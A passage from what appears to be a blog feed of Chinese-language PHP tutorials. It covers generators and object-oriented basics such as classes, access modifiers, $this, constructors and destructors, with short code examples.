10000;$i++){        yield $i;    }}$g = getArr();foreach($g as $v){    echo $v . &apos; &apos;;}</code></pre><p>2、生成器实际运用：从数据库获取一张表所有记录，然后输出所有记录到表格</p><pre><code>$conn = @mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;,&apos;db_2&apos;,&apos;3306&apos;) or die(&apos;数据库连接失败！&apos;);mysqli_set_charset($conn,&apos;utf8&apos;) or die(&apos;字符集设置失败！&apos;);function query($conn,$sql){    $res = mysqli_query($conn,$sql);    while($row = mysqli_fetch_assoc($res)){        yield $row;        # 这样就不需要数组保存大数据了，如果数据量够大会产生很大的消耗    }}# 遍历输出$list = query($conn,&apos;select * from t_40&apos;);echo &apos;&lt;table border=1&gt;&apos;;foreach($list as $v){    echo &lt;&lt;&lt;EOD        &lt;tr&gt;            &lt;td&gt;{$v[&apos;id&apos;]}&lt;/td&gt;&lt;td&gt;{$v[&apos;name&apos;]}&lt;/td&gt;&lt;td&gt;{$v[&apos;age&apos;]}&lt;/td&gt;&lt;td&gt;{$v[&apos;gender&apos;]}&lt;/td&gt;&lt;td&gt;{$v[&apos;class_name&apos;]}&lt;/td&gt;        &lt;/tr&gt;EOD;}echo &apos;&lt;/table&gt;&apos;;</code></pre><blockquote><p>小结</p></blockquote><p>1、生成器是一种实现了Iterator迭代器接口的类</p><p>2、生成器的目的是利用yield关键字实现循环内部的暂停，而直到yield被使用使用循环才会继续执行，从而节省通过循环产生一个大数组的过程，最终实现内存优化</p><p>3、在大型数据展示的时候（数据库数据操作、文件读取）都建议使用生成器来实现内存解析</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php面向对象基础</title>
      <link href="/2021/07/25/php%E5%AD%A6%E4%B9%A0/1PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/07/25/php%E5%AD%A6%E4%B9%A0/1PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h4 id="转载自：黑马程序员武汉中心"><a href="#转载自：黑马程序员武汉中心" class="headerlink" title="转载自：黑马程序员武汉中心"></a>转载自：<a href="https://space.bilibili.com/434398031?spm_id_from=333.788.b_765f7570696e666f.1" target="_blank" rel="noopener">黑马程序员武汉中心</a></h4><h1 id="面向对象基础"><a href="#面向对象基础" class="headerlink" title="面向对象基础"></a>面向对象基础</h1><blockquote><p>学习目标：理解面向对象编程思想，了解计算机编程语言的演变过程，掌握PHP面向对象的基础语法，使用面向对象编程思想和面向对象语法实现编程解决需求问题</p></blockquote><ul><li>计算机语言发展史</li><li>面向过程编程思想</li><li>面向对象编程思想</li><li>面向对象基础语法</li><li>综合运用</li></ul><blockquote><p><strong>概念</strong></p></blockquote><p><strong>编程语法发展史</strong>：计算机编程在历史的发展长河中，经历了多次<code>版本变革</code>，变化的轨迹是伴随着硬件的发展和人们对于计算机的认知以及需求。</p><ul><li><p>机器语言：即开发者（科学家）使用<code>0</code>和<code>1</code>组成命令，然后在特定计算机上执行</p><ul><li><p>优点：执行效率高</p></li><li><p>缺点：开发难度大、移植性差、开发成本高</p></li></ul></li><li><p>汇编语言：开发者使用简洁<code>英文字母</code>和<code>符号</code>组成，让计算机读取后根据符号进行加工执行</p><ul><li>优点：指令简单明了、推广性高</li><li>缺点：移植性差、功能简单</li></ul></li><li><p>高级计算机语言：开发者使用类似自然语言的<code>符号</code>组成，高级语言根据编程思想分为<code>面向过程编程</code>和<code>面向对象编程</code>两种，然后系统对程序代码进行编译（需要第三方编译器）然后执行</p><ul><li>优点：移植性强、可读性强、推广性非常高</li><li>缺点：执行效率降低</li></ul></li></ul><p><strong>面向过程编程</strong></p><ul><li><p>将要解决的问题（功能需求）分解成具体的步骤，然后通过<strong>函数编程</strong>实现每一个步骤，最后通过函数规定好的顺序调用完成</p></li><li><p>面向过程编程思想的优点</p><ul><li>能够针对步骤拆分，进行模块化封装（函数）</li><li>可以实现代码复用，从而节省开发成本</li></ul></li><li><p>面向过程编程思想的缺点</p><ul><li>不够灵活维护，流程一旦确定就必须按照既定方式执行到底。</li></ul></li></ul><blockquote><p><strong>小结</strong></p></blockquote><p>1、计算机编程从对开发人员要求极高到要求不高，是一代代人坚持不懈的结果</p><p>2、面向对象编程是目前最为符合人类思维逻辑的一种编程思想</p><h2 id="一、面向对象编程思想"><a href="#一、面向对象编程思想" class="headerlink" title="一、面向对象编程思想"></a>一、面向对象编程思想</h2><blockquote><p>目标：理解面向对象编程思想与面向过程编程思想的区别，了解面向对象编程思想的核心，建立面向对象编程思想</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>面向对象编程思想</strong>：面向对象编程也叫做OOP编程（Objected Oriented Programming），是一种基于面向过程的开发思想。与面向过程强调分解事务步骤相似，面向对象更需要追求事务操作的“主体”，也就是<code>对象</code></p><ul><li><p>面向对象编程是一种编程思想，不是一种具体技术</p></li><li><p>面向对象是在面向过程基础之上发展而来，因此也是一种模块化编程思想（有函数）</p></li><li><p>面向对象能够更加方便的实现代码的重复利用（适用于大型项目）</p></li><li><p>在面向对象思维中，任何动作的执行或者数据都属于对象（一切皆对象）</p></li></ul><blockquote><p>原理</p></blockquote><p>1、面向过程编程思想原理<br>2、面向对象编程思想原理</p><blockquote><p><strong>小结</strong></p></blockquote><ol><li>面向对象编程是一种编程思想，与技术无关</li><li>面向对象编程的本质是增加数据和功能的操作主体，即对象</li><li>面向对象中所有的数据和功能都是由主体（对象）来调用和操作</li></ol><h2 id="二、面向对象基础"><a href="#二、面向对象基础" class="headerlink" title="二、面向对象基础"></a><strong>二、面向对象基础</strong></h2><blockquote><p>学习目标：掌握面向对象的基础语法，能够使用面向对象思想和语法来解决需求问题</p></blockquote><ul><li>面向对象关键字</li><li>类的定义、实例化和对象</li><li>类成员</li><li>访问修饰限定符</li><li>内部对象$this</li><li>面向对象开发规范</li><li>魔术方法</li><li>成员访问</li><li>静态成员</li><li>自动加载</li><li>克隆</li><li>综合运用</li></ul><blockquote><p>示例</p></blockquote><p>1、面向过程的方式实现一个功能：购买商品</p><pre><code># 定义函数购买商品function buy($goods_id,$num = 1){    echo &apos;商品：&apos; . $goods_id . &apos;购买：&apos; . $num . &apos;个！&apos;;    return ;}# 调用解决buy(1,10);    # 输出： 商品：1购买10个</code></pre><p>2、面向对象的方式实现一个功能：购买商品</p><pre><code># 确定是消费者购买（类）class Buyer{    # 拥有购买功能（方法）    function buy($id,$num = 1){        echo &apos;商品：&apos; . $goods_id . &apos;购买：&apos; . $num . &apos;个！&apos;;        return ;    }}# 确定具体买家购买$b = new Buyer();    # 产生具体买家（对象）$b-&gt;buy(1,10);        # 输出： 商品：1购买10个</code></pre><blockquote><p>小结</p></blockquote><p>1、面向对象是一种编程思想，编程语言要实现这种编程思想就会有一些相应的语法格式出现</p><p>2、使用面向对象语法格式实现的功能才属于面向对象编程（OOP）</p><h3 id="1、面向对象关键字说明"><a href="#1、面向对象关键字说明" class="headerlink" title="1、面向对象关键字说明"></a><strong>1、面向对象关键字说明</strong></h3><blockquote><p>目标：了解面向对象编程中一些关键字的意义</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>面向对象关键字</strong>：基于面向对象开发时，所用到的一些关键字，用来表明不同的结构或者类型</p><ul><li><p>类：class，是定义面向对象主体的最外层结构，用来包裹主体的数据和功能（函数）。类是一类具有共性事务的代表，代表的是事务的共性。</p></li><li><p>对象：object，是某类事务的具体代表，也是实际数据和功能操作的具体单元，也被称之为实例（instance）</p></li><li><p>实例化：new，从一个抽象的概念得到一个符合抽象概念的具体实例的过程</p></li><li><p>类成员：member，指类class结构中的所有内容，类成员里有三种</p><ul><li>方法：method，本质是在类class结构中创建的函数，也称之为<code>成员方法</code>或者成员函数</li><li>属性：property，本质是在类class结构中创建的变量，也称之为<code>成员变量</code></li><li>类常量：const，本质是在类class结构中创建的常量</li></ul></li></ul><blockquote><p>小结</p></blockquote><p>1、因为面向对象思想的出现，会多出一些结构语法关键字</p><p>2、了解关键字的作用后，才能更灵活的应用关键字实现面向对象编程</p><h3 id="2、面向对象简单技术实现"><a href="#2、面向对象简单技术实现" class="headerlink" title="2、面向对象简单技术实现"></a><strong>2、面向对象简单技术实现</strong></h3><blockquote><p>目标：掌握类、对象和实例化之间的关系</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>类</strong>：根据对象分析后得到的一种通用结构（分类）</p><ul><li>class关键字声明类</li><li>类名：自定义名字，通常首字母大写，一般多单词组成类使用驼峰法（大驼峰法）</li><li><p>大括号：类内部的结构（member，类成员）</p><p>class 类名{</p><p>}</p></li><li><p>实例化：类产生对象的过程</p><p>new 类名;<br>new 类名();    # 使用较多</p></li><li><p>对象：根据类产生的某个具体存在的实体（instance），对象一般使用变量保存</p><p>$object = new 类名();</p></li></ul><blockquote><p>步骤</p></blockquote><p>1、根据需求产生类结构（class）</p><ul><li>分析类拥有的数据</li><li>分析类的行为</li></ul><p>2、在需要使用对象的地方，对类进行实例化（new），并保存对象</p><blockquote><p>示例</p></blockquote><p>1、定义类基本语法：class 类名{}</p><pre><code># 定义一个空类class Nothing{}</code></pre><p>2、类实例化产生对象：new</p><pre><code># 实例化，并将产生的对象保存在变量中$n = new Nothing();# 打印对象var_dump($n);# 打印结果分析object(Nothing)#1 (0) { } object：对象(Nothing)：所属类名 #1：对象编号，与类无关，是整个脚本中对象的序号，从1开始(0)：成员变量（属性）个数   {}：具体成员变量信息（键值对）</code></pre><p>3、类class是一种结构，如果写好没有语法错误的情况下，代码不会执行（与函数定义一样），也无法打印输出</p><pre><code># 直接打印类名var_dump(Nothing);        # 错误，提示未定义的常量</code></pre><p>4、类的命名规范：类的命名规范与函数类似，区别在于人为的通常会将类名的首字母大写</p><pre><code># 有效类名class My1{}class My_1{}class _My1{}# 无效类名class 1My{}class 1_my{}</code></pre><p>5、如果碰到多单词组成的类名，通常使用驼峰法</p><pre><code>class MyClass{}</code></pre><blockquote><p><strong>小结</strong></p></blockquote><ol><li>通过class关键字 + 类名 +{}创建类</li><li>类是一种结构，不会自动运行，也不能输出</li><li>通过new 类名实例化对象得到类的具体对象</li><li>可以通过new实例化无限个对象</li></ol><h3 id="3、类成员"><a href="#3、类成员" class="headerlink" title="3、类成员"></a><strong>3、类成员</strong></h3><blockquote><p>目标：了解类成员的类型，类成员的作用，能够运用类成员去创建有效类</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>类成员</strong>：指<strong>直接定义</strong>在类结构{}内部的一级成员，即直接依赖{}的成员</p><ul><li>类成员分类<ul><li>成员变量（属性）：给对象存储数据的变量</li><li>成员函数（方法）：给对象调用解决问题的函数</li><li>类常量：属于类内部的常量，使用const关键字定义</li></ul></li><li><p>属性和方法需要使用<strong>访问修饰限定符修饰</strong>，姑且使用public修饰</p><p>class 类名{</p><pre><code># 类常量（可以多个）const 常量名 = 值;# 属性（可以多个）public $属性名 [ = 值];    # 可以赋值也可以不赋值，只声明# 方法（可以多个）[public] function 方法名([形参列表]){    # 方法体（返回值）}</code></pre><p>}</p></li><li><p>成员访问：属性和方法都属于对象访问，类常量属于类访问（后续再讲）</p><ul><li>对象访问属性和方法，使用<code>-&gt;</code></li></ul><h1 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h1><p>$object = new 类名();</p><h1 id="属性访问"><a href="#属性访问" class="headerlink" title="属性访问"></a>属性访问</h1><p>$object-&gt;属性名;        # 此时不带属性本身的$符号（前面保存对象的变量带$符号，object-&gt;属性名是整体）</p><h1 id="方法访问"><a href="#方法访问" class="headerlink" title="方法访问"></a>方法访问</h1><p>$object-&gt;方法名([实参列表]);</p></li></ul><blockquote><p>步骤</p></blockquote><p>1、声明类结构</p><p>2、明确类产生的对象是否需要有数据的存储：确定属性</p><p>3、明确类产生的对象是否需要函数实现功能：确定方法</p><p>4、明确类是否需要定义常量：确定类常量</p><p>5、对象实例化</p><p>6、类成员访问（属性和方法）</p><blockquote><p>示例</p></blockquote><p>1、声明类结构</p><pre><code># 定义买家类：买家有姓名，有钱class Buyer{    # 属性声明    $name;                # 错误，类内部属性必须使用访问修饰限定符    public $name;        # 正确：没有赋值    public $money = 0;    # 正确：有赋值    # 方法声明    function display(){        echo __CLASS__;    # 魔术常量，输出类名    }    # 类常量声明    const BIG_NAME = &apos;BUYER&apos;;}</code></pre><p>2、成员变量访问（属性和方法）：成员必须通过对象才能进行访问，需要先通过实例化得到对象，然后通过对象实现对成员进行操作</p><pre><code># 实例化对象$b = new Buyer();# 访问属性echo $b-&gt;money;# 修改属性$b-&gt;money = 1000;# 删除属性unset($b-&gt;name);# 新增属性$b-&gt;age = 20;# 访问方法$b-&gt;display();</code></pre><p><strong>注意</strong></p><ul><li><p>删除属性和新增属性通常使用较少，更多的属性操作是访问和修改</p></li><li><p>类常量不是由对象来进行访问，所以暂时不做访问讲解，到后面知识再讲</p></li><li><p>属性和方法的使用都必须确保类中已经定义（属性可以新增）</p></li></ul><p>3、类成员中：属性、类常量和方法都可以无限定义，但是定义的原则是相关性。除了以上三个类成员，不能在类结构{}中直接写其他任何代码</p><pre><code>class Buyer{    echo __CLASS__;                    # 错误    define(&apos;PI&apos;,3.14);                 # 错误    if(true){ echo &apos;hello world&apos;}    # 错误}    </code></pre><blockquote><p><strong>小结</strong></p></blockquote><p>1、PHP类结构中有且仅有三种成员：属性、方法和类常量，其他直接属于类的内容都会报错</p><p>2、类声明需要根据业务来确定类成员的存在和数量</p><p>3、类中属性和方法的访问方式都是通过对象来调用：$对象-&gt;属性名/方法名()；注意属性名不带$符号</p><p>4、类中定义属性不能直接属性名，需要使用符号public修饰（访问修饰限定符中的一种）</p><h3 id="4、访问修饰限定符"><a href="#4、访问修饰限定符" class="headerlink" title="4、访问修饰限定符"></a><strong>4、访问修饰限定符</strong></h3><blockquote><p>目标：理解访问修饰限定符的作用，掌握访问修饰限定符的实际运用</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>访问修饰限定符</strong>：用在属性或者方法前的修饰关键字，是用来控制属性或者方法的访问位置</p><ul><li>访问修饰限定符分类<ul><li>public：公有，类内和类外都可以访问</li><li>protected：受保护，只允许在相关类内部访问</li><li>private：私有，只允许在定义类内部访问</li></ul></li><li>属性必须有访问修饰限定符，方法可以没有访问修饰限定符（默认public）</li></ul><blockquote><p>步骤</p></blockquote><p>1、声明类结构</p><p>2、确定类成员</p><p>3、确定类成员的访问位置限定，使用对应访问修饰限定符</p><p>4、只能在对应位置访问被修饰的成员</p><blockquote><p>示例</p></blockquote><p>1、公有成员访问</p><pre><code>class Saler{    # 属性    public $count = 100;    # 方法    public function getCount(){        echo __METHOD__;        # 魔术常量，显示当前方法名（包含类名）    }    function setCount(){        echo __METHOD__;    }}# 实例化对象$s = new Saler();# 访问（类外）echo $s-&gt;count;$s-&gt;getCount();$s-&gt;setCount();</code></pre><p>2、受保护和私有成员设定（当前受保护和私有一致，需要高阶知识才会有区别）</p><pre><code>class Buyer{    # 属性    protected $money = 10;    private $account = &apos;6226000000000001&apos;;    # 方法    protected function getMoney(){        echo __METHOD__;    }    private function getAccount(){        echo __METHOD__;    }}# 实例化$b = new Buyer();echo $b-&gt;money;        # 错误：当前属于类外部，不能访问echo $b-&gt;account;    # 错误：当前属于类外部，不能访问$b-&gt;getMoney();        # 错误：当前属于类外部，不能访问$b-&gt;getAccount();    # 错误：当前属于类外部，不能访问</code></pre><blockquote><p><strong>总结</strong></p></blockquote><p>1、访问修饰限定符分为三种：public、protected和private，访问权限依次降低（类对成员控制权限依次增加）</p><p>2、访问修饰限定符限定的是成员到底在哪里能被访问，私有和受保护都只能在类内部访问，公有可以在任何地方访问（但都必须是对象去访问）</p><p>3、属性必须写清楚访问修饰限定符，方法可以省去（不建议），因为系统默认是public</p><h3 id="5、类内部对象"><a href="#5、类内部对象" class="headerlink" title="5、类内部对象"></a><strong>5、类内部对象</strong></h3><blockquote><p>目标：理解内部对象的概念，掌握内部对象对成员的访问</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>内部对象</strong>：$this，<strong>方法内部</strong>内置的一个对象，会自动指向来调用方法的对象</p><ul><li>$this存在于方法内部（仅限内部使用），所以相当于在类的结构内部<ul><li>可以访问任意访问修饰限定符修饰的成员</li><li>私有成员都是通过公有方法来实现访问（公有方法可以在类外部访问）</li></ul></li><li>类内部对类成员的访问也需要通过对象才能访问，所以必须通过$this内部对象访问类成员</li></ul><blockquote><p>步骤</p></blockquote><p>1、声明类结构</p><p>2、明确私有成员（不限定成员的访问修饰限定符）</p><p>3、私有成员需要在某种情况下被访问：增加方法，在方法里使用$this访问</p><blockquote><p>示例</p></blockquote><p>1、尝试在类内部方法中访问属性</p><pre><code>class Saler{      # 属性      public $count = 100;      protected $discount = 0.8;      private $money = 100;    public function getAll(){        echo $count,$discount,$money;    # 全部错误：提示未定义的“变量”    }                    }$s = new Saler();$s-&gt;getAll();</code></pre><p><strong>注意</strong>：方法本质是定义在类内部的函数，因此受制于作用域的问题，在方法内部访问的变量系统认定为局部变量（必须内部定义或者参数传入），否则就会提示未定义</p><p>2、类内部访问类成员，需要通过对象来进行访问</p><pre><code>class Saler{      # 属性      public $count = 100;      protected $discount = 0.8;      private $money = 100;    public function getAll(){        # 需要获取到对象名字：因为方法本身就是函数，访问外部全局变量可以通过global引入实现        global $s;        echo $s-&gt;count,$s-&gt;discount,$s-&gt;money;        #正确输出    }                    }$s = new Saler();$s-&gt;getAll();</code></pre><p><strong>注意</strong>：上述代码规定死了以后对象只能是$s，不能有其他对象或者其他命名，所以非常不友好</p><p>3、使用内置对象$this访问</p><pre><code>class Saler{      # 属性      public $count = 100;      protected $discount = 0.8;      private $money = 100;    public function getAll(){        var_dump($this);        echo $this-&gt;count,$this-&gt;discount,$this-&gt;money;        #正确输出    }                    }$s = new Saler();$s-&gt;getAll();</code></pre><p><strong>注意</strong>：$this代表的是对象，而$this所在环境为类内部的方法内部，所以$this对象是在类内部访问，因此可以访问所有的属性和方法，不受访问修饰限定符限制</p><blockquote><p>$this、class和new之间的关系原理</p></blockquote><ul><li><p>class是定义类结构，属于非执行段代码，因此会被加载到代码段（编译阶段）</p></li><li><p>new是实例化对象，先判定类在内存（代码段）是否存在</p><ul><li>类不存在，报错；</li><li>类存在，将类内部的属性部分复制一份，然后在内存（堆区）开辟一块内存空间，将属性放到里面，同时内部有一个<strong>指针</strong>指向类的内存空间（代码段）</li><li>对象访问属性即访问的是对象空间里存储的部分</li><li>对象访问方法是对象通过<strong>内部指针</strong>找到类空间中的方法，然后在内存（栈区）开辟运行</li></ul></li><li><p>$this是系统在方法内置的对象通用名字</p><ul><li>对象在调用方法的时候，系统会自动找到对象所保存的内存地址（堆区），然后把地址赋值给$this</li></ul></li><li><p>方法内部的$this就代表调用当前$this所在方法的外部对象</p><ul><li>$this的本质是函数内部的一个局部变量，只是系统自动对其进行赋值，而且一定是调用方法的对象本身</li></ul></li><li>面向对象编程代码运行内存关系</li></ul><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-vRLjf8Y3-1586427577961)(效果图\面向对象编程代码运行内存关系.gif)]</p><blockquote><p><strong>小结</strong></p></blockquote><p>1、类内部方法内有一个内置对象$this，代表访问该方法的外部对象</p><p>2、类在实例化对象的时候要保证内存中有该类</p><p>3、一个类可以实例化多个对象，每个对象访问成员方法时，$this就代表对应对象</p><h3 id="6、面向对象开发规范"><a href="#6、面向对象开发规范" class="headerlink" title="6、面向对象开发规范"></a><strong>6、面向对象开发规范</strong></h3><blockquote><p>目标：了解面向对象的基本开发规范，熟练运用开发规范实现项目开发</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>开发规范</strong>：开发者约定俗成的开发设计方式</p><ul><li>属性的初始化<ul><li>属性是类对于同类事务所抽离出来的共性<code>数据</code>，本身在类结构中没有价值，是当具体对象产生之后，属于对象本身的</li><li>进行类中定义属性的时候，通常不会对属性进行初始化，除非属性本身的值也具有共性</li><li>属性如果没有初始化数据，那么在产生对象后应该对属性完成初始化（有的属性是在操作过程中被初始化）</li></ul></li><li>访问修饰限定符选择：访问修饰限定符是用来限制类成员被对象访问时对象所处位置的。访问的权限从public、protected到private依次变小（类对成员的控制权限依次变大）<ul><li>设定好的类成员本身不会被外部用到，那么应该使用private或者protected</li><li>设定好的类成员一定会给外部访问，使用public</li><li>属性通常private居多，如果需要外部访问属性，通常会定义相关方法来实现属性的查看和修改，因为可以在方法内对数据逻辑进行代码控制，安全</li><li>尽可能增加类对成员的控制（尽可能多使用private，少使用public）</li></ul></li></ul><blockquote><p>示例</p></blockquote><p>1、属性初始化</p><pre><code>class Saler{      # 属性      public $count;                    # 某个卖家拥有的商品数量，每位具体卖家对象拥有的不可能一样，所以没必要初始化      protected $discount;    # 某个卖家针对销售的折扣，同样没有统一的价值      private $money = 0;    # 某个卖家的账户余额，任何一位卖家一开始做生意的时候，账户余额都为0，所以可以初始化    # 业务初始化属性    public function setDiscount($discount = 1){        # 可以进行逻辑控制        $this-&gt;discount = $discount;    }}# 实例化对象，初始化属性$s = new Saler();$s-&gt;count = 100;# 打折促销：业务初始化$s-&gt;setDiscount(0.8);</code></pre><p>2、访问修饰限定符选择</p><pre><code>class Saler{      # 属性      public $count;                      private $money = 0;    # 增加方法操作私有属性money    public function getMoney(){        return $this-&gt;money;    }    public function setMoney($money){        # 可以对逻辑进行修改，对数据进行安全判定，保证数据的安全性        $this-&gt;money = $money;        # $this-&gt;money是属性，$money是外部传入的参数，二者同名但是性质完全不同    }}  </code></pre><blockquote><p><strong>小结</strong></p></blockquote><p>1、属性在类中定义的时候，通常不会初始化值，除非所有类实例化得到的对象的某个属性需要是统一值</p><p>2、应该尽可能增加类对成员的控制，即使用范围较小的访问修饰限定符优先</p><p>3、属性通常是私有化的，一般是通过设定方法来实现属性的访问和修改</p><h3 id="7、构造方法"><a href="#7、构造方法" class="headerlink" title="7、构造方法"></a><strong>7、构造方法</strong></h3><blockquote><p>目标：了解<strong>魔术方法</strong>的概念，掌握构造方法的作用，明确构造方法的触发模式</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>构造方法</strong>：__construct()，是一种类结构特有的特殊方法，该方法由系统规定好，开发人员在定义的时候只需要<strong>抄</strong>一遍，有了构造方法的类在实例化对象之后，对象就会自动调用。</p><ul><li>构造方法是一种魔术方法：<strong>魔术方法</strong>是会自动被触发，不需要手动调用的方法</li><li>构造方法的目标是为了实现对象的初始化<ul><li>对象实例化之后会自动调用</li><li>构造方法通常是为了实现对象所需资源的初始化（属性、资源）</li></ul></li><li>构造方法虽然为魔术方法，但本质依然是一个方法<ul><li>受访问修饰限定符控制（对象的产生位置会发生改变）</li><li>对象可以选择调用（一般不会）</li></ul></li><li>构造方法可以设定形参，形参对应的实参是在实例化对象的时候传入：new 类名(实参传递给形参)</li></ul><blockquote><p>步骤</p></blockquote><p>1、确定类中需要有数据实现初始化，而且是灵活处理，每个对象都不一样的：使用构造方法</p><p>2、确定初始化的数据需要外部传入：使用构造方法设定形参</p><p>3、在构造方法内部利用内部对象实现初始化需求</p><ul><li>属性初始化</li><li>资源初始化</li><li>其他内置方法调用</li></ul><p>4、实例化对象时必须传入构造方法所需数据</p><blockquote><p>示例</p></blockquote><p>1、构造方法实现：在类中增加一个方法__construct()即可</p><pre><code>class Saler{    # 构造方法    public function __construct(){        echo __CLASS__;    }}</code></pre><p>2、构造方法也是一个方法，不普通的地方在于，类实例化得到的对象会马上自动调用</p><pre><code># 实例化new Saler();                # 输出Saler</code></pre><p>3、构造方法的意义：构造方法是对象实例化的时候用来初始化对象的资源的，所以通常是用来初始化对象的属性或者其他资源初始化</p><pre><code>class Saler{      # 属性      public $count;                      private $money;    # 构造方法：初始化属性    public function __construct(){        $this-&gt;count = 100;        $this-&gt;money = 100;    }}</code></pre><p>5、如果属性的数据在构造方法中初始化是固定写死的，那么与直接在定义类的时候初始化属性一样。意味着数据没有任何价值（所有对象都相同），因此通常是通过构造方法的参数来实现数据的外部传入</p><pre><code>class Saler{      # 属性      public $count;                      private $money;    # 构造方法：初始化属性    public function __construct($count,$money){        $this-&gt;count = $count;        $this-&gt;money = $money;    }}</code></pre><p>5、一旦构造方法拥有了形参，那么对象在调用该方法的时候就需要传入对应的实参，而构造方法又是自动调用的，所以需要在实例化对象的时候使用new 类名(构造方法对应的实参列表)来实现</p><pre><code># 实例化对象$s1 = new Saler(100,100);$s2 = new Saler(1000,1000);$s3 = new Saler;            # 错误：因为此时类有构造方法且要求传入参数，所以必须使用（）并传入数据</code></pre><p><strong>注意</strong>：之前所说的<code>new 类名</code> 和<code>new 类名()</code>没有区别是因为没有构造方法，或者构造方法没有参数限定，一旦构造方法有了参数，那么<code>new 类名</code> 就不能直接使用了。</p><p>6、构造方法不管再怎么特殊，也是用户定义的方法，言外之意除了在实例化对象时对象会自动调用之外，我们也可以手动调用构造方法（但是一般没有价值，因为对象实例化时会自动调用）</p><pre><code>class Saler{      # 属性      public $count;                      private $money;    # 构造方法：初始化属性    public function __construct($count,$money){        $this-&gt;count = $count;        $this-&gt;money = $money;    }}# 实例化$s = new Saler(100,100);            # 系统在new Saler(100,100)好之后，会自动调用一次$s-&gt;__construct(1000,1000);            # 允许手动调用</code></pre><blockquote><p><strong>小结</strong></p></blockquote><p>1、构造方法__construct()是一种系统内置的方法，该方法的特性是会在对象实例化之后，对象立即自动调用</p><p>2、构造方法的目的就是为了初始化资源，包含对象属性和其他资源</p><p>3、一旦构造方法定义好之后，且构造方法自带参数，那么就只能使用<code>new 类名(参数列表)</code>方式才能正确实例化</p><p>4、构造方法可以当做普通方法由对象调用（不建议）</p><h3 id="8、析构方法"><a href="#8、析构方法" class="headerlink" title="8、析构方法"></a><strong>8、析构方法</strong></h3><blockquote><p>目标：了解析构方法的作用，能够实际应用析构方法</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>析构方法</strong>：__destruct()，也是一种类结构中魔术方法，与构造方法一样，也是系统规定好，只需要开发人员<strong>抄</strong>一遍即可，对象在被销毁时会自动调用</p><ul><li>析构方法是用来对象销毁时主动释放资源的</li><li>对象销毁<ul><li>对象无变量指向（变量指向其他数据）</li><li>对象被主动销毁（unset销毁对象变量）</li><li>脚本执行结束（自动释放资源）</li></ul></li><li>PHP脚本执行结束会释放所有资源，所以一般较少使用析构方法</li></ul><blockquote><p>步骤</p></blockquote><p>1、定义类结构</p><p>2、确定需要在对象销毁时释放资源</p><p>3、使用析构方法释放资源</p><blockquote><p>示例</p></blockquote><p>1、析构方法实现：类中增加一个__destruct()方法</p><pre><code>class Saler{      # 析构方法    public function __destruct(){        echo __FUNCTION__;    }}</code></pre><p>2、析构方法调用：析构方法是在对象被销毁时自动，对象的“垂死挣扎”</p><pre><code># 实例化对象$s = new Saler();# 对象变量指向其他数据$s = 1;    # 主动销毁对象变量unset($s);            # 脚本执行结束自动释放</code></pre><p>3、析构方法也是普通方法，可以由对象直接调用</p><pre><code># 接析构方法实现代码$s = new Saler();$s-&gt;__destruct();        # 思考：此时对象是否被销毁？</code></pre><blockquote><p><strong>小结</strong></p></blockquote><p>1、析构方法是一种对象销毁时自动调用的方法</p><p>2、析构方法是用来对象销毁自身所占用的资源</p><p>3、PHP中脚本执行结束，系统会自动回收所有资源，因此一般PHP中很少使用析构方法</p><h3 id="9、对象传值"><a href="#9、对象传值" class="headerlink" title="9、对象传值"></a><strong>9、对象传值</strong></h3><blockquote><p>目标：了解PHP中对象传值的方式</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>对象传值</strong>：将保存对象的变量赋值给另外一个变量</p><ul><li>在PHP中，对象的传值是<strong>引用传递</strong>的：即一个对象变量赋值给另外一个变量，两个变量指向同一个对象的内存地址，即只有一个对象。</li></ul><blockquote><p>步骤</p></blockquote><p>1、定义类结构</p><p>2、实例化产生对象，保存在变量中</p><p>3、将保存对象的变量赋值给另外一个变量</p><blockquote><p>示例</p></blockquote><p>1、对象传值就是保存对象的变量赋值给另外一个变量</p><pre><code>class Saler{}$s1 = new Saler();$s2 = $s1;</code></pre><p>2、对象传值是引用传递，不管对象赋值给多少个变量，内存中只有一个对象</p><pre><code># 证明var_dump($s1,$s2);        # 同一个对象$s1-&gt;name = &apos;Saler&apos;;    # 更改一个变量所保存对象的属性echo $s2-&gt;name;            # 输出Saler</code></pre><blockquote><p><strong>小结</strong></p></blockquote><p>1、对象传值方式是<strong>引用传值</strong>，不论对象如何被赋值给其他变量，始终只有一个对象</p><h3 id="10、范围解析操作符（类常量访问）"><a href="#10、范围解析操作符（类常量访问）" class="headerlink" title="10、范围解析操作符（类常量访问）"></a><strong>10、范围解析操作符（类常量访问）</strong></h3><blockquote><p>目标：理解范围解析操作符的概念和目标，掌握范围解析操作符的应用</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>范围解析操作符</strong>：由两个冒号组成“<strong>::</strong>”，是专门用于<strong>类实现类成员操作</strong>的，可以实现类直接访问类成员</p><ul><li><p>范围解析操作符是用于给类（类名）访问类成员使用的</p><p>类名::类成员</p></li><li><p>范围解析操作符也可以被对象用来当做类使用（不建议使用）</p><p>$对象名::类成员</p></li><li><p>类常量只能被类访问</p></li></ul><blockquote><p>步骤</p></blockquote><p>1、定义类结构</p><p>2、确定成员需要由类进行管理：类常量</p><p>3、在需要访问类常量的时候使用范围解析操作符访问</p><blockquote><p>示例</p></blockquote><p>1、类常量的普通访问尝试：尝试使用对象进行访问</p><pre><code>class Saler{    # 类常量    const PI = 3.14;}$s1 = new Saler();echo $s1-&gt;PI;            # 